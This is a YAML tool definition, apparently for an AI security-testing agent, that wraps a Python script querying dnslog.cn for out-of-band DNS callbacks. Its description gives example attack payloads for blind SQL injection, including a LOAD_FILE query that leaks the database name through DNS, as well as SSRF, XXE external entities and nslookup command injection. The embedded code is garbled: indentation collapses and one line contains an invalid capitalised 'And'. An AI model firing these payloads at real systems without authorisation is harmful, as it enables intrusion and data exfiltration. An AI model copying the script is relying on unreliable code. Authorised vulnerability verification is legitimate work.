name: "dnslog"
command: "python3"
args:
  - "-c"
  - "import sys\nimport requests\nimport json\nimport time\nimport os\nimport tempfile\n\nif len(sys.argv) < 2:\n    sys.stderr.write(\"错误: 缺少操作类型参数 (get_domain 或 get_records)\\n\")\n    sys.exit(1)\n\noperation = sys.argv[1]\nbase_url = \"http://dnslog.cn\"\n\n# Use temporary files to store cookies\ncookie_file = os.path.join(tempfile.gettempdir(), \"dnslog_cookie.txt\")\n\n# Create session to keep Cookie\nsession = requests.Session()\n\n# If Cookie file exists, load Cookie\ntry:\n if os.path.exists(cookie_file):\n with open(cookie_file, 'r') as f:\n for line in f:\n if 'PHPSESSID' in line:\n session.cookies.set('PHPSESSID', line.strip().split('=')[1])\nexcept:\n pass\n\ntry:\n if operation == \"get_domain\":\n # Get the temporary domain name (this will set the cookie)\n response = session.get(f\"{base_url}/getdomain.php\", timeout=10)\n response.raise_for_status()\n domain = response.text.strip().rstrip('%')\n \n # Save Cookie to file\n try:\n with open(cookie_file, 'w') as f:\n for cookie in session.cookies:\n f.write(f\"{cookie.name}={cookie.value}\\n\")\n        except:\n            pass\n        \n        if domain:\n            result = {\n                \"status\": \"success\",\n                \"domain\": domain,\n                \"message\": f\"成功获取临时域名: {domain}\",\n                \"usage\": f\"使用此域名进行DNS查询测试，例如: nslookup {domain} 或 ping http://{domain}\",\n                \"note\": \"域名有效期为24小时，请及时查询记录\"\n            }\n            print(json.dumps(result, ensure_ascii=False, indent=2))\n        else:\n            print(json.dumps({\n                \"status\": \"error\",\n                \"message\": \"未能获取到域名，请稍后重试\"\n            }, ensure_ascii=False, indent=2))\n            sys.exit(1)\n    \n    elif operation == \"get_records\":\n # Get DNS query records\n if len(sys.argv) < 3:\n sys.stderr.write(\"错误: get_records 操作需要提供域名参数\\n\")\n sys.exit(1)\n \n domain = sys.argv[2]\n wait_time = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3] else 0\n \n # If wait time is specified, wait first\n if wait_time > 0:\n print(f\"等待 {wait_time} 秒后查询记录...\", file=sys.stderr)\n time.sleep(wait_time)\n \n # Load Cookie (if it exists)\n try:\n if os.path.exists(cookie_file):\n with open(cookie_file, 'r') as f:\n for line in f:\n if 'PHPSESSID' in line:\n session.cookies.set('PHPSESSID', line.strip().split('=')[1])\n except:\n pass\n \n response = session.get(f\"{base_url}/getrecords.php\", params={\"t\": domain}, timeout=10)\n        response.raise_for_status()\n        records_text = response.text.strip().rstrip('%')\n        \n        if records_text and records_text != \"[]\"And records_text.strip():\n # Try to parse to JSON (if the returned format is JSON)\n try:\n records = json.loads(records_text)\n if isinstance(records, list) and len(records) > 0:\n result = {\n \"status\": \"success\",\n                        \"domain\": domain,\n                        \"record_count\": len(records),\n                        \"records\": records,\n                        \"message\": f\"发现 {len(records)} 条DNS查询记录\"\n                    }\n                    print(json.dumps(result, ensure_ascii=False, indent=2))\n                else:\n                    result = {\n                        \"status\": \"no_records\",\n                        \"domain\": domain,\n                        \"records\": [],\n                        \"message\": \"暂无DNS查询记录，目标可能尚未触发DNS查询\"\n }\n print(json.dumps(result, ensure_ascii=False, indent=2))\n except json.JSONDecodeError:\n # If not JSON, split by line\n records = [line.strip() for line in records_text.split(\"\\n\") if line.strip() and line.strip() != \"[]\"]\n                if records:\n                    result = {\n                        \"status\": \"success\",\n                        \"domain\": domain,\n                        \"record_count\": len(records),\n                        \"records\": records,\n                        \"message\": f\"发现 {len(records)} 条DNS查询记录\"\n                    }\n                    print(json.dumps(result, ensure_ascii=False, indent=2))\n                else:\n                    result = {\n                        \"status\": \"no_records\",\n                        \"domain\": domain,\n                        \"records\": [],\n                        \"message\": \"暂无DNS查询记录\"\n                    }\n                    print(json.dumps(result, ensure_ascii=False, indent=2))\n        else:\n            result = {\n                \"status\": \"no_records\",\n                \"domain\": domain,\n                \"records\": [],\n                \"message\": \"暂无DNS查询记录，目标可能尚未触发DNS查询\"\n            }\n            print(json.dumps(result, ensure_ascii=False, indent=2))\n    \n    else:\n        sys.stderr.write(f\"错误: 未知的操作类型 '{operation}'，支持的操作: get_domain, get_records\\n\")\n        sys.exit(1)\n\nexcept requests.RequestException as e:\n    error_result = {\n        \"status\": \"error\",\n        \"message\": f\"请求失败: {str(e)}\",\n        \"suggestion\": \"请检查网络连接或稍后重试\"\n    }\n    print(json.dumps(error_result, ensure_ascii=False, indent=2))\n    sys.exit(1)\nexcept Exception as e:\n    error_result = {\n        \"status\": \"error\",\n        \"message\": f\"执行出错: {str(e)}\"\n    }\n    print(json.dumps(error_result, ensure_ascii=False, indent=2))\n    sys.exit(1)\n"
enabled: true
short_description: "DNSlog tool for blind injection, SSRF, XXE and other non-echo vulnerability verification"
description: |
DNSlog is a DNS query recording tool, implemented through the dnslog.cn service. Mainly used to verify no-echo vulnerabilities, such as blind injection, SSRF, XXE, command injection, etc.

**Main functions:**
- Obtain temporary domain name: Generate a unique temporary domain name for DNS query testing
- Query DNS records: Check whether any DNS query request reaches the domain name
- Support waiting time: you can wait for a specified time before querying for asynchronous vulnerability verification

**Usage scenario:**
- **Blind SQL Injection Test**: Use DNS query in SQL injection payload to confirm successful injection
- Example: `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.xxx.dnslog.cn\\abc'))`
- **SSRF vulnerability verification**: Confirm the existence of SSRF vulnerability through DNS query
- Example: `http://target.com/api?url=http://xxx.dnslog.cn`
- **XXE Vulnerability Validation**: Trigger DNS query via external entity reference
    - 示例：`<!ENTITY xxe SYSTEM "http://xxx.dnslog.cn">`
- **Command Injection Test**: Use DNS query in command injection payload
- Example: `nslookup xxx.dnslog.cn` or `ping xxx.dnslog.cn`
- **No echo vulnerability verification**: Any situation where you need to confirm whether the target performed a specific operation

**Workflow:**
1. Use `operation=get_domain` to obtain the temporary domain name (such as: `abc123.dnslog.cn`)
2. Use this domain name in the vulnerability test payload
3. Use `operation=get_records` to check whether there are DNS query records
4. If you see the record, it means that the vulnerability exists and the payload has been executed.

**Note:**
- The temporary domain name is valid for 24 hours
- DNS query may be delayed. It is recommended to wait a few seconds before querying the records.
- This tool relies on the dnslog.cn service and requires a network connection
- The tool automatically manages cookie sessions to ensure that the same session is used to obtain domain names and query records.
parameters:
  - name: "operation"
    type: "string"
    description: |
Operation type, supports two operations:
- `get_domain`: Get the temporary domain name
- `get_records`: Query DNS records
    required: true
    position: 0
    format: "positional"
  - name: "domain"
    type: "string"
    description: |
Domain name parameter (only used for get_records operation)

When the operation is get_records, this parameter is required, and the temporary domain name obtained previously needs to be provided.
    required: false
    position: 1
    format: "positional"
  - name: "wait_time"
    type: "int"
    description: |
Wait time (seconds, only for get_records operations)

The number of seconds to wait before querying DNS records. Used to give the target system enough time to perform DNS queries.
Recommended value: 3-10 seconds, adjusted based on network latency and vulnerability type.
    required: false
    position: 2
    format: "positional"
    default: 0
